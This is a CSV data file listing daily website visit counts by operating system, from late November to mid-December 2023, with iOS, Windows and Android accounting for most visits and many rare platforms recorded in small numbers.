date,os,visits
2023-12-12,iOS,17979134
2023-12-12,Windows,15139056
2023-12-12,Android,8617224
2023-12-12,Macintosh,4720681
2023-12-12,Chrome OS,1152181
2023-12-12,Linux,970343
2023-12-12,(not set),54143
2023-12-12,Tizen,940
2023-12-12,OS/2,603
2023-12-12,Fuchsia,547
2023-12-12,Firefox OS,421
2023-12-12,Playstation 4,302
2023-12-12,BlackBerry,105
2023-12-12,FreeBSD,66
2023-12-12,OpenBSD,43
2023-12-12,UNIX,39
2023-12-12,Samsung,35
2023-12-12,Xbox,35
2023-12-12,Windows Phone,26
2023-12-12,SymbianOS,20
2023-12-12,NetBSD,19
2023-12-12,SunOS,10
2023-12-12,Mac OS,8
2023-12-12,Sony,7
2023-12-12,Nokia,6
2023-12-12,Playstation Vita,4
2023-12-12,LG,3
2023-12-12,WebTV,3
2023-12-12,macOS X,3
2023-12-12,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,3
2023-12-12,PalmOS,2
2023-12-12,BeOS,1
2023-12-12,IRIX,1
2023-12-12,Solaris,1
2023-12-12,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-12,iPhone,1
2023-12-12,realme/RMX2185/RMX2185:10/QP1A.190711.020/1655708528:user/release-keys,1
2023-12-11,iOS,19000515
2023-12-11,Windows,15421722
2023-12-11,Android,9175234
2023-12-11,Macintosh,4744340
2023-12-11,Chrome OS,1154442
2023-12-11,Linux,988263
2023-12-11,(not set),49841
2023-12-11,Tizen,921
2023-12-11,OS/2,630
2023-12-11,Fuchsia,536
2023-12-11,Firefox OS,417
2023-12-11,Playstation 4,320
2023-12-11,BlackBerry,117
2023-12-11,FreeBSD,70
2023-12-11,UNIX,54
2023-12-11,OpenBSD,38
2023-12-11,Samsung,35
2023-12-11,Xbox,34
2023-12-11,Windows Phone,31
2023-12-11,NetBSD,20
2023-12-11,SymbianOS,14
2023-12-11,Playstation Vita,6
2023-12-11,Sony,6
2023-12-11,Mac OS,4
2023-12-11,SunOS,4
2023-12-11,Nintendo Wii,3
2023-12-11,PalmOS,3
2023-12-11,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,3
2023-12-11,LG,2
2023-12-11,Nokia,2
2023-12-11,Playstation 3,1
2023-12-11,Vodafone,1
2023-12-11,macOS X,1
2023-12-10,iOS,13070609
2023-12-10,Android,6766552
2023-12-10,Windows,5693904
2023-12-10,Macintosh,3028622
2023-12-10,Linux,794155
2023-12-10,Chrome OS,385113
2023-12-10,(not set),34525
2023-12-10,Tizen,937
2023-12-10,Fuchsia,600
2023-12-10,OS/2,587
2023-12-10,Firefox OS,434
2023-12-10,Playstation 4,388
2023-12-10,BlackBerry,114
2023-12-10,FreeBSD,64
2023-12-10,Xbox,34
2023-12-10,OpenBSD,33
2023-12-10,Windows Phone,30
2023-12-10,Samsung,27
2023-12-10,UNIX,21
2023-12-10,SymbianOS,16
2023-12-10,NetBSD,10
2023-12-10,SunOS,10
2023-12-10,Playstation Vita,6
2023-12-10,Sony,5
2023-12-10,Mac OS,3
2023-12-10,Nintendo Wii,3
2023-12-10,Nokia,3
2023-12-10,LG,2
2023-12-10,PalmOS,2
2023-12-10,macOS X,2
2023-12-10,Playstation 3,1
2023-12-10,Solaris,1
2023-12-10,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-10,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-10,WebTV,1
2023-12-10,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-09,iOS,15730805
2023-12-09,Android,7611695
2023-12-09,Windows,5373222
2023-12-09,Macintosh,2794971
2023-12-09,Linux,834340
2023-12-09,Chrome OS,310108
2023-12-09,(not set),37561
2023-12-09,Tizen,974
2023-12-09,OS/2,685
2023-12-09,Fuchsia,638
2023-12-09,Firefox OS,450
2023-12-09,Playstation 4,407
2023-12-09,BlackBerry,95
2023-12-09,FreeBSD,80
2023-12-09,UNIX,65
2023-12-09,OpenBSD,37
2023-12-09,Xbox,35
2023-12-09,Samsung,32
2023-12-09,SymbianOS,25
2023-12-09,Windows Phone,20
2023-12-09,NetBSD,15
2023-12-09,Mac OS,9
2023-12-09,Sony,9
2023-12-09,PalmOS,7
2023-12-09,SunOS,7
2023-12-09,Playstation Vita,6
2023-12-09,Nokia,5
2023-12-09,Solaris,3
2023-12-09,BeOS,1
2023-12-09,MOT,1
2023-12-09,NTT DoCoMo,1
2023-12-09,Playstation Portable,1
2023-12-09,Vodafone,1
2023-12-09,macOS X,1
2023-12-09,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-08,iOS,18141472
2023-12-08,Windows,12029833
2023-12-08,Android,8513504
2023-12-08,Macintosh,4013482
2023-12-08,Chrome OS,1023744
2023-12-08,Linux,1023146
2023-12-08,(not set),42952
2023-12-08,Tizen,913
2023-12-08,OS/2,647
2023-12-08,Fuchsia,548
2023-12-08,Firefox OS,448
2023-12-08,Playstation 4,389
2023-12-08,UNIX,145
2023-12-08,BlackBerry,102
2023-12-08,FreeBSD,76
2023-12-08,OpenBSD,39
2023-12-08,Xbox,36
2023-12-08,Samsung,31
2023-12-08,SymbianOS,30
2023-12-08,Windows Phone,26
2023-12-08,NetBSD,22
2023-12-08,Nokia,10
2023-12-08,Mac OS,6
2023-12-08,Sony,6
2023-12-08,BeOS,3
2023-12-08,Playstation Vita,3
2023-12-08,SunOS,3
2023-12-08,macOS X,3
2023-12-08,MOT,2
2023-12-08,PalmOS,2
2023-12-08,NTT DoCoMo,1
2023-12-08,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,1
2023-12-08,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-07,iOS,19839824
2023-12-07,Windows,15065560
2023-12-07,Android,8984619
2023-12-07,Macintosh,4742842
2023-12-07,Chrome OS,1230112
2023-12-07,Linux,1138846
2023-12-07,(not set),40251
2023-12-07,Tizen,920
2023-12-07,OS/2,666
2023-12-07,Fuchsia,577
2023-12-07,Firefox OS,459
2023-12-07,Playstation 4,403
2023-12-07,BlackBerry,108
2023-12-07,FreeBSD,89
2023-12-07,Xbox,43
2023-12-07,OpenBSD,36
2023-12-07,Samsung,33
2023-12-07,UNIX,28
2023-12-07,SymbianOS,23
2023-12-07,Windows Phone,21
2023-12-07,NetBSD,14
2023-12-07,Mac OS,10
2023-12-07,SunOS,7
2023-12-07,Playstation Vita,6
2023-12-07,Sony,6
2023-12-07,PalmOS,5
2023-12-07,macOS X,3
2023-12-07,Nokia,2
2023-12-07,BeOS,1
2023-12-07,HPUX,1
2023-12-07,MOT,1
2023-12-07,Playstation 3,1
2023-12-07,Playstation Portable,1
2023-12-07,iPhone,1
2023-12-06,iOS,19312115
2023-12-06,Windows,16174418
2023-12-06,Android,8936159
2023-12-06,Macintosh,4831355
2023-12-06,Chrome OS,1219619
2023-12-06,Linux,1134953
2023-12-06,(not set),41177
2023-12-06,Tizen,981
2023-12-06,OS/2,562
2023-12-06,Fuchsia,507
2023-12-06,Firefox OS,441
2023-12-06,Playstation 4,370
2023-12-06,BlackBerry,101
2023-12-06,FreeBSD,82
2023-12-06,UNIX,71
2023-12-06,Windows Phone,39
2023-12-06,Xbox,36
2023-12-06,OpenBSD,31
2023-12-06,Samsung,31
2023-12-06,SymbianOS,23
2023-12-06,NetBSD,16
2023-12-06,Mac OS,8
2023-12-06,SunOS,8
2023-12-06,Nokia,4
2023-12-06,Playstation Vita,4
2023-12-06,Sony,4
2023-12-06,PalmOS,3
2023-12-06,macOS X,2
2023-12-06,IRIX,1
2023-12-06,Nintendo Wii,1
2023-12-06,Playstation 3,1
2023-12-06,Vodafone,1
2023-12-06,iPhone,1
2023-12-05,iOS,19363618
2023-12-05,Windows,15870248
2023-12-05,Android,9359706
2023-12-05,Macintosh,5010919
2023-12-05,Chrome OS,1267683
2023-12-05,Linux,1190116
2023-12-05,(not set),36460
2023-12-05,Tizen,982
2023-12-05,OS/2,594
2023-12-05,Fuchsia,566
2023-12-05,Firefox OS,483
2023-12-05,Playstation 4,354
2023-12-05,BlackBerry,99
2023-12-05,FreeBSD,78
2023-12-05,UNIX,51
2023-12-05,OpenBSD,40
2023-12-05,Xbox,33
2023-12-05,Samsung,26
2023-12-05,NetBSD,20
2023-12-05,Windows Phone,20
2023-12-05,SymbianOS,18
2023-12-05,Mac OS,9
2023-12-05,Playstation Vita,9
2023-12-05,Sony,9
2023-12-05,SunOS,6
2023-12-05,Nintendo Wii,4
2023-12-05,PalmOS,4
2023-12-05,macOS X,4
2023-12-05,Nokia,3
2023-12-05,BeOS,1
2023-12-05,IRIX,1
2023-12-05,NTT DoCoMo,1
2023-12-05,SoftBank,1
2023-12-05,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-05,Vodafone,1
2023-12-05,iPhone,1
2023-12-04,iOS,20046163
2023-12-04,Windows,16429056
2023-12-04,Android,9538506
2023-12-04,Macintosh,5304277
2023-12-04,Chrome OS,1227045
2023-12-04,Linux,1080348
2023-12-04,(not set),32946
2023-12-04,Tizen,1021
2023-12-04,OS/2,604
2023-12-04,Fuchsia,556
2023-12-04,Firefox OS,451
2023-12-04,Playstation 4,367
2023-12-04,BlackBerry,119
2023-12-04,FreeBSD,91
2023-12-04,UNIX,66
2023-12-04,Samsung,46
2023-12-04,Windows Phone,34
2023-12-04,OpenBSD,33
2023-12-04,Xbox,31
2023-12-04,NetBSD,18
2023-12-04,SymbianOS,17
2023-12-04,Mac OS,11
2023-12-04,Sony,6
2023-12-04,Nokia,4
2023-12-04,SunOS,4
2023-12-04,PalmOS,3
2023-12-04,macOS X,3
2023-12-04,MOT,2
2023-12-04,Playstation Vita,2
2023-12-04,SoftBank,2
2023-12-04,BeOS,1
2023-12-04,NTT DoCoMo,1
2023-12-04,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-12-04,OnePlus/OnePlus7Pro_EEA/OnePlus7Pro:12/SKQ1.211113.001/P.202301251815:user/release-keys,1
2023-12-04,Playstation 3,1
2023-12-04,Solaris,1
2023-12-03,iOS,13661379
2023-12-03,Android,6963910
2023-12-03,Windows,6073273
2023-12-03,Macintosh,3289828
2023-12-03,Linux,917120
2023-12-03,Chrome OS,401947
2023-12-03,(not set),21745
2023-12-03,Tizen,951
2023-12-03,OS/2,617
2023-12-03,Fuchsia,554
2023-12-03,Firefox OS,393
2023-12-03,Playstation 4,319
2023-12-03,BlackBerry,114
2023-12-03,FreeBSD,64
2023-12-03,Samsung,34
2023-12-03,UNIX,34
2023-12-03,OpenBSD,30
2023-12-03,Xbox,27
2023-12-03,SymbianOS,24
2023-12-03,NetBSD,22
2023-12-03,Windows Phone,22
2023-12-03,Playstation Vita,7
2023-12-03,Sony,7
2023-12-03,Mac OS,6
2023-12-03,PalmOS,4
2023-12-03,Nokia,2
2023-12-03,SunOS,2
2023-12-03,macOS X,2
2023-12-03,BeOS,1
2023-12-03,IRIX,1
2023-12-03,Nintendo Wii,1
2023-12-03,Vodafone,1
2023-12-02,iOS,16397242
2023-12-02,Android,8016086
2023-12-02,Windows,6069318
2023-12-02,Macintosh,3027077
2023-12-02,Linux,886619
2023-12-02,Chrome OS,346461
2023-12-02,(not set),23930
2023-12-02,Tizen,1038
2023-12-02,Fuchsia,608
2023-12-02,OS/2,599
2023-12-02,Firefox OS,410
2023-12-02,Playstation 4,357
2023-12-02,BlackBerry,95
2023-12-02,FreeBSD,88
2023-12-02,OpenBSD,49
2023-12-02,UNIX,46
2023-12-02,Samsung,40
2023-12-02,NetBSD,30
2023-12-02,Xbox,25
2023-12-02,Windows Phone,18
2023-12-02,SymbianOS,13
2023-12-02,Mac OS,11
2023-12-02,Sony,7
2023-12-02,SunOS,7
2023-12-02,Nokia,4
2023-12-02,Playstation Vita,3
2023-12-02,MOT,2
2023-12-02,PalmOS,2
2023-12-02,WebTV,1
2023-12-02,macOS X,1
2023-12-02,samsung/a53xnsxx/a53x:13/TP1A.220624.014/A536EXXU7CWGJ:user/release-keys,1
2023-12-02,samsung/t2qzhx/t2q:13/TP1A.220624.014/G9960ZHU5EWH6:user/release-keys,1
2023-12-01,iOS,19113402
2023-12-01,Windows,13664534
2023-12-01,Android,8866282
2023-12-01,Macintosh,4523400
2023-12-01,Chrome OS,1143538
2023-12-01,Linux,986266
2023-12-01,(not set),28428
2023-12-01,Tizen,1227
2023-12-01,OS/2,689
2023-12-01,Fuchsia,515
2023-12-01,Firefox OS,512
2023-12-01,Playstation 4,335
2023-12-01,FreeBSD,90
2023-12-01,BlackBerry,78
2023-12-01,Samsung,36
2023-12-01,Xbox,33
2023-12-01,OpenBSD,27
2023-12-01,UNIX,22
2023-12-01,NetBSD,21
2023-12-01,Windows Phone,20
2023-12-01,SymbianOS,19
2023-12-01,Mac OS,13
2023-12-01,Sony,9
2023-12-01,Playstation Vita,7
2023-12-01,SunOS,7
2023-12-01,Nokia,6
2023-12-01,PalmOS,6
2023-12-01,Playstation Portable,2
2023-12-01,macOS X,2
2023-12-01,BeOS,1
2023-12-01,NTT DoCoMo,1
2023-12-01,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,iOS,18809314
2023-11-30,Windows,16309153
